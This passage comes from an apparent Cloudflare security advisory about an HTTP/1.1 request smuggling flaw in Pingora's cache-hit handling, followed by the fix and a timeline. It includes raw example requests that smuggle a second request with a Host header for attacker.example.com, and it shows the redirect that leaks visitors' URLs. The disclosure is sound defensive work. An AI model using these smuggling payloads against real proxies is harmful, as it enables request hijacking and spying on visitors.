However, only one request can be processed on a connection at a time (with rare exceptions such as <a href=\"https://www.rfc-editor.org/rfc/rfc9112.html#section-9.3.2\"><u>HTTP/1.1 pipelining</u></a>). The RFC notes that each request must have a “<a href=\"https://www.rfc-editor.org/rfc/rfc9112.html#section-9.3-7\"><u>self-defined message length</u></a>” for its body, as indicated by headers such as <code>Content-Length</code> or <code>Transfer-Encoding</code> to determine where one request ends and another begins.</p><p>Pingora generally handles requests on HTTP/1.1 connections in an RFC-compliant manner, either ensuring the downstream request body is properly consumed or declining to reuse the connection if it encounters an error. After the bug was filed, we discovered that when caching was enabled, this logic was skipped on cache hits (i.e. when the service’s cache backend can serve the response without making an additional upstream request).</p><p>This meant on a cache hit request, after the response was sent downstream, any unread request body left in the HTTP/1.1 connection could act as a vector for request smuggling. When formed into a valid (but incomplete) header, the request body could “poison” the subsequent request. The following example is a spec-compliant HTTP/1.1 request which exhibits this behavior:</p>\n            <pre class=\"language-Rust\"><code class=\"language-Rust\">GET /attack/foo.jpg HTTP/1.1\nHost: example.com\n&lt;other headers…&gt;\ncontent-length: 79\n\nGET / HTTP/1.1\nHost: attacker.example.com\nBogus: foo</pre></code>\n            <p>Let’s say there is a different request to <code>victim.example.com</code> that will be sent after this one on the reused HTTP/1.1 connection to a Pingora reverse proxy. The bug means that a Pingora service may not respect the <code>Content-Length</code> header and instead misinterpret the smuggled request as the beginning of the next request:</p>\n            <pre class=\"language-Rust\"><code class=\"language-Rust\">GET /attack/foo.jpg HTTP/1.1\nHost: example.com\n&lt;other headers…&gt;\ncontent-length: 79\n\nGET / HTTP/1.1 // &lt;- “smuggled” body start, interpreted as next request\nHost: attacker.example.com\nBogus: fooGET /victim/main.css HTTP/1.1 // &lt;- actual next valid req start\nHost: victim.example.com\n&lt;other headers…&gt;</pre></code>\n            <p>Thus, the smuggled request could inject headers and its URL into a subsequent valid request sent on the same connection to a Pingora reverse proxy service.</p>\n    <div class=\"flex anchor relative\">\n      <h2 id=\"cdn-request-smuggling-and-hijacking\">CDN request smuggling and hijacking</h2>\n      <a href=\"#cdn-request-smuggling-and-hijacking\" aria-hidden=\"true\" class=\"relative sm:absolute sm:-left-5\">\n        <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\"><path fill=\"currentcolor\" d=\"m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z\"></path></svg>\n      </a>\n    </div>\n    <p>On April 11, 2025, Cloudflare was in the process of rolling out a Pingora proxy component with caching support enabled to a subset of CDN free plan traffic. This component was vulnerable to this request smuggling attack, which could enable modifying request headers and/or URL sent to customer origins.</p><p>As previously noted, the security researcher reported that they were also able to cause visitors to Cloudflare sites to make subsequent requests to their own malicious origin and observe which site URLs the visitor was originally attempting to access. During our investigation, Cloudflare found that certain origin servers would be susceptible to this secondary attack effect. The smuggled request in the example above would be sent to the correct origin IP address per customer configuration, but some origin servers would respond to the rewritten attacker <code>Host</code> header with a 301 redirect. Continuing from the prior example:</p>\n            <pre class=\"language-Rust\"><code class=\"language-Rust\">GET / HTTP/1.1 // &lt;- “smuggled” body start, interpreted as next request\nHost: attacker.example.com\nBogus: fooGET /victim/main.css HTTP/1.1 // &lt;- actual next valid req start\nHost: victim.example.com\n&lt;other headers…&gt;\n\nHTTP/1.1 301 Moved Permanently // &lt;- susceptible victim origin response\nLocation: https://attacker.example.com/\n&lt;other headers…&gt;</pre></code>\n            <p>When the client browser followed the redirect, it would trigger this attack by sending a request to the attacker hostname, along with a Referrer header indicating which URL was originally visited, making it possible to load a malicious asset and observe what traffic a visitor was trying to access.</p>\n            <pre class=\"language-Rust\"><code class=\"language-Rust\">GET / HTTP/1.1 // &lt;- redirect-following request\nHost: attacker.example.com\nReferrer: https://victim.example.com/victim/main.css\n&lt;other headers…&gt;</pre></code>\n            <p>Upon verifying the Pingora proxy component was susceptible, the team immediately disabled CDN traffic to the vulnerable component on 2025-04-12 06:44 UTC to stop possible exploitation. By 2025-04-19 01:56 UTC and prior to re-enablement of any traffic to the vulnerable component, a patch fix to the component was released, and any assets cached on the component’s backend were invalidated in case of possible cache poisoning as a result of the injected headers.</p>\n    <div class=\"flex anchor relative\">\n      <h2 id=\"remediation-and-next-steps\">Remediation and next steps</h2>\n      <a href=\"#remediation-and-next-steps\" aria-hidden=\"true\" class=\"relative sm:absolute sm:-left-5\">\n        <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\"><path fill=\"currentcolor\" d=\"m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z\"></path></svg>\n      </a>\n    </div>\n    <p>If you are using the caching functionality in the Pingora framework, you should update to the latest version of <a href=\"https://github.com/cloudflare/pingora/releases/tag/0.5.0\"><u>0.5.0.</u></a> If you are a Cloudflare customer with a free plan, you do not need to do anything, as we have already applied the patch for this vulnerability.</p>\n    <div class=\"flex anchor relative\">\n      <h2 id=\"timeline\">Timeline</h2>\n      <a href=\"#timeline\" aria-hidden=\"true\" class=\"relative sm:absolute sm:-left-5\">\n        <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\"><path fill=\"currentcolor\" d=\"m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z\"></path></svg>\n      </a>\n    </div>\n    <p><i>All timestamps are in UTC.</i></p><ul><li><p>2025-04-11 09:20 – Cloudflare is notified of a CDN request smuggling vulnerability via the Bug Bounty Program.</p></li><li><p>2025-04-11 17:16 to 2025-04-12 03:28 – Cloudflare confirms vulnerability is reproducible and investigates which component(s) require necessary changes to mitigate.</p></li><li><p>2025-04-12 04:25 – Cloudflare isolates issue to roll out of a Pingora proxy component with caching enabled and prepares release to disable traffic to this component.</p></li><li><p>2025-04-12 06:44 – Rollout to disable traffic complete, vulnerability mitigated.</p></li></ul>\n    <div class=\"flex anchor relative\">\n      <h2 id=\"conclusion\">Conclusion</h2>\n      <a href=\"#conclusion\" aria-hidden=\"true\" class=\"relative sm:absolute sm:-left-5\">\n        <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\"><path fill=\"currentcolor\" d=\"m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z\"></path></svg>\n      </a>\n    </div>\n    <p>We would like to sincerely thank <a href=\"https://www.linkedin.com/in/james-kettle-albinowax/\"><u>James Kettle</u></a> &amp; <a href=\"https://www.linkedin.com/in/wannes-verwimp/\"><u>Wannes Verwimp</u></a>, who responsibly disclosed this issue via our <a href=\"https://www.cloudflare.com/en-gb/disclosure/\"><u>Cloudflare Bug Bounty Program</u></a>, allowing us to identify and mitigate the vulnerability.
